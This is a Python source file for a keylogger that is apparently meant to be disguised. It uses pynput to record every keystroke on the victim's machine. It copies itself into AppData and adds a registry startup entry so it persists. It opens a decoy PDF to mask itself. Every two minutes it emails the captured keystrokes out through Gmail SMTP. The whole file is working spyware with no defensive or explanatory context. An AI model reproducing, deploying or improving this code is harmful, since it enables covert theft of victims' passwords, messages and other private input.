from pynput import keyboard
import threading,sys,smtplib,os,shutil,subprocess

class KeyLog:
    log = "KeyLogger started"
    em=" "
    passw=" "

    def __init__(self,em,passwd):
        p=os.environ["appdata"]+"\\major.exe"
        if not os.path.exists(p):
            shutil.copyfile(sys.executable,p)
            subprocess.run("REG ADD HKCU\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v important /t REG_SZ /d "+"\""+p+"\"")
        file=os.path.abspath(".")+"adhoc_net.pdf"
        subprocess.Popen(file,shell=True)

        self.em=em
        self.passw=passwd
        print(self.log)

    def append_log(self,string):
        self.log=self.log+str(string)

    def send_e(self):
        print(self.log)
        self.send_email()
        self.log=" "
        thread = threading.Timer(120, self.send_e)
        thread.start()

    def send_email(self):
        smtpob = smtplib.SMTP("smtp.gmail.com", 587)
        smtpob.ehlo()
        smtpob.starttls()
        smtpob.ehlo()
        smtpob.login(self.em, self.passw)
        smtpob.sendmail(self.em, self.em, "\n\n" + self.log)
        smtpob.quit()


    def takeup(self, key):
        string=" "
        try:
            string=key.char
        except:
            if (key == keyboard.Key.space):
                string=" "
            else:
                string=str(key)+"  "
        self.append_log(string)

    def start(self):
        me = keyboard.Listener(on_press=self.takeup)
        with me:
            self.send_e()
            me.join()
